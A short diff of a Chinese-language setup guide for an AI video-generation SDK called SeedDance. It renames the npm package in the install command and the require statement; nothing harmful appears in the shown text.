@@ -12,7 +12,7 @@ description: 集成百度SeedDance AI视频生成SDK，支持文本到视频功�
 第一步：安装 SeedDance Node.js SDK。直接运行以下命令：
 
 ```bash
-npm install @baidu-seedance/seeddance-sdk
+npm install @seeddance/node-sdk
 ```
 
 > 注意：必须先完成 SDK 安装，后续所有功能依赖此包。
@@ -22,7 +22,7 @@ npm install @baidu-seedance/seeddance-sdk
 ### 文本到视频
 
 ```javascript
-const { SeedDance } = require('@baidu-seedance/seeddance-sdk');
+const { SeedDance } = require('@seeddance/node-sdk');
 
 const client = new SeedDance({ region: 'cn-beijing' });
 
